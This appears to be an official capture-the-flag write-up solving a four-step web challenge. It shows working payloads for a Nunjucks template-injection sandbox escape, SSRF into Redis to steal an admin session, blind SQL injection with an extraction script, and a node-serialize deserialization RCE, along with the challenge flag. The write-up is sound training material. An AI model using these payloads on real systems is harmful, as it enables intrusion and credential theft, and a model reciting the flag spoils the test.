# Operation Nightfall — Official Write-up

**Category:** Web Exploitation  
**Difficulty:** Hard  
**Points:** 1000 (Dynamic)  
**Flag:** `flag{n1ghtf4ll_ch41n_compl3t3_2024}` (default, randomized per deployment)

---

## Overview

This challenge requires chaining **four vulnerabilities** across a realistic multi-service web application:

| Step | Vulnerability | Impact |
|------|--------------|--------|
| 1 | Server-Side Template Injection (SSTI) | Leak internal API credentials |
| 2 | Server-Side Request Forgery (SSRF) | Steal admin session from Redis |
| 3 | Blind SQL Injection | Extract secrets from database |
| 4 | Deserialization RCE (CVE-2017-5941) | Read flag file from server |

## Architecture

The challenge consists of:
- **Gateway** (port 8080) — Public-facing Express.js + Nunjucks
- **Internal API** (port 3001) — Internal Express.js microservice
- **Admin Bot** — Periodically refreshes admin session in Redis
- **PostgreSQL** — Database with users, projects, and secrets
- **Redis** — Session store

Only port 8080 is exposed to players.

---

## Step 1: Server-Side Template Injection (SSTI)

### Discovery

The landing page has a **System Status** link. The status page (`/status`) has a service filter form that accepts a `service` query parameter.

Testing with basic template syntax:

```
GET /status?service={{7*7}}
```

The response contains `49` in the output, confirming **Nunjucks SSTI**.

### Exploitation

Nunjucks runs in a sandboxed environment, but the sandbox can be escaped using the `range.constructor` technique:

```
GET /status?service={{range.constructor("return process.env")()}}
```

This returns the full `process.env` object as JSON, revealing:

```json
{
  "INTERNAL_API_KEY": "intk_a7f3b9c2e1d4068597fabcde12345678",
  "INTERNAL_API_URL": "http://internal-api:3001",
  "REDIS_URL": "redis://:R3d1s_N0v4_2024!@redis:6379",
  ...
}
```

**Key discovery:** The `INTERNAL_API_KEY` and `REDIS_URL` reveal the internal architecture.

### Why This Works

In `gateway/src/app.js`, the `/status` endpoint directly interpolates user input into a Nunjucks template string:

```javascript
const templateString = `
  {% extends "status.njk" %}
  {% block status_content %}
  <div class="status-query">
    <p>Service filter: <code>${service}</code></p>
  </div>
  {% endblock %}
`;
const rendered = nunjucks.renderString(templateString, { ... });
```

The `${service}` is a JavaScript template literal interpolation (not Nunjucks). The user input is placed directly into the template source before Nunjucks processes it. Nunjucks `autoescape` only prevents XSS in template *variables*, not in the template *source*.

---

## Step 2: SSRF via Webhook → Admin Session Theft

### Discovery

With the leaked `INTERNAL_API_KEY`, we can access the internal API. But first, we need an authenticated session. Checking the login page source reveals an HTML comment:

```html
<!-- Default dev account: developer / N0v4D3v2024 -->
```

Login with `developer:N0v4D3v2024` and access the dashboard.

### Exploration

The dashboard provides access to the internal API via the gateway proxy at `/api/v1/*`. Exploring the API reveals a **webhook testing** endpoint:

```
POST /api/v1/webhooks/test
{"url": "https://example.com/webhook"}
```

### SSRF Exploitation

The webhook endpoint makes HTTP requests to user-supplied URLs. It has a blocklist for common cloud metadata endpoints and `localhost`, but **Docker internal hostnames** (`redis`, `postgres`) are not blocked.

We know from Step 1 that Redis is at `redis:6379`. Send an HTTP request to Redis:

```
POST /api/v1/webhooks/test
{"url": "http://redis:6379/", "method": "POST", "body": "KEYS session:*\r\nGET system:active_sessions_info\r\n"}
```

Redis interprets the HTTP request lines as commands. The response reveals:
1. Active session key names
2. The `system:active_sessions_info` key written by the admin bot, which contains the admin session token prefix

Using the discovered token prefix, we can construct the full admin session token:

```
POST /api/v1/webhooks/test
{"url": "http://redis:6379/", "method": "POST", "body": "GET session:sess_adm1n_7f3b9c2e1d40685_n0v4c0rp\r\n"}
```

This returns the admin session data, confirming the token is valid.

### Admin Access

Set the session cookie:

```
Cookie: session_token=sess_adm1n_7f3b9c2e1d40685_n0v4c0rp
```

Verify admin access:

```
GET /api/v1/admin/users
→ 200 OK (returns all users)
```

---

## Step 3: Blind SQL Injection (Optional but Rewarding)

### Discovery

The admin panel has a search endpoint:

```
GET /api/v1/admin/search?q=admin
```

Testing for SQLi:

```
GET /api/v1/admin/search?q=admin' AND '1'='1
→ Returns results (true condition)

GET /api/v1/admin/search?q=admin' AND '1'='2
→ Returns no results (false condition)
```

This confirms **Boolean-based Blind SQL Injection**.

### Exploitation

We can extract data from the `secrets` table. The challenge has a `flag_encryption_key` secret:

```python
# Boolean-based extraction
for pos in range(1, 30):
    for char in 'abcdefghijklmnopqrstuvwxyz0123456789_':
        payload = f"x' AND (SELECT CASE WHEN (SELECT substring(secret_value,{pos},1) FROM secrets WHERE secret_name='flag_encryption_key')='{char}' THEN 1 ELSE 0 END)=1-- -"
        r = requests.get(f"{URL}/api/v1/admin/search?q={payload}")
        if r.json()['count'] > 0:
            key += char
            break
```

**Extracted key:** `n1ghtf4ll_k3y_x7q9`

This step is optional — the flag can be obtained directly via Step 4's RCE without this key. But it demonstrates the database contains valuable secrets.

---

## Step 4: Deserialization RCE (node-serialize CVE-2017-5941)

### Discovery

The admin panel has a data export endpoint:

```
POST /api/v1/admin/export
{"format": "json"}
→ Returns user data in JSON format

POST /api/v1/admin/export
{"format": "custom", "template": "<base64-encoded template>"}
→ Custom format using a deserialized template
```

The `custom` format accepts a Base64-encoded "template" that is deserialized.

### Exploitation

The `node-serialize` library (v0.0.4) has a well-known deserialization vulnerability (CVE-2017-5941). It supports serialization of JavaScript functions using the `_$$ND_FUNC$$_` prefix. Adding `()` at the end creates an Immediately Invoked Function Expression (IIFE) that executes during deserialization.

Construct the RCE payload:

```python
import base64
import json

payload = {
    "rce": "_$$ND_FUNC$$_function(){return require('child_process').execSync('cat /tmp/flag.txt').toString().trim()}()"
}

template = base64.b64encode(json.dumps(payload).encode()).decode()
```

Send the exploit:

```
POST /api/v1/admin/export
{
  "format": "custom",
  "template": "eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXR1cm4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjYXQgL3RtcC9mbGFnLnR4dCcpLnRvU3RyaW5nKCkudHJpbSgpfSgpIn0="
}
```

Response:

```json
{
  "success": true,
  "format": "custom",
  "data": "{\"title\":\"User Export\",\"metadata\":{\"rce\":\"flag{n1ghtf4ll_ch41n_compl3t3_2024}\"},...}"
}
```

**🚩 FLAG: `flag{n1ghtf4ll_ch41n_compl3t3_2024}`**

---

## Alternative Approaches

### Skip Step 3 (SQLi)

Step 3 is optional. Once you have admin access from Step 2, you can go directly to Step 4 (RCE) without extracting the database secrets. The SQLi step exists to reward thorough enumeration and add depth to the challenge.

### SSRF via 127.0.0.1

The SSRF blocklist blocks `localhost` but not `127.0.0.1`. Players can use this to access Redis on `127.0.0.1:6379` if Docker networking maps the port (though in the default config, Redis is on the internal network only).

### Time-based Blind SQLi

If boolean-based extraction doesn't work cleanly, players can use time-based blind SQLi with `pg_sleep()`:

```
GET /api/v1/admin/search?q=x' AND (SELECT CASE WHEN (substring(...)='a') THEN pg_sleep(2) ELSE pg_sleep(0) END)-- -
```

---

## Tools Used

- **Browser** — Initial reconnaissance
- **Burp Suite / curl** — Request interception and crafting
- **Python + requests** — Exploit automation
- **sqlmap** (optional) — Can be used for Step 3, but manual extraction is faster for this specific case

## Learning Objectives

1. **SSTI Detection and Exploitation** — Understanding template engine internals and sandbox escapes
2. **SSRF in Microservice Architectures** — Exploiting trust between internal services
3. **Blind SQL Injection** — Boolean-based and time-based data extraction
4. **Deserialization Vulnerabilities** — Understanding why untrusted data should never be deserialized
5. **Exploit Chaining** — Combining multiple low/medium findings into a critical chain

## Real-World Relevance

- **SSTI** is a common vulnerability in applications that dynamically construct templates (email services, CMS platforms, status pages)
- **SSRF** is consistently in the OWASP Top 10 and was the root cause of the Capital One breach
- **Blind SQLi** remains one of the most impactful web vulnerabilities in production applications
- **Deserialization RCE** affects multiple languages (Java, PHP, Python, Node.js, Ruby) and has caused numerous real-world breaches
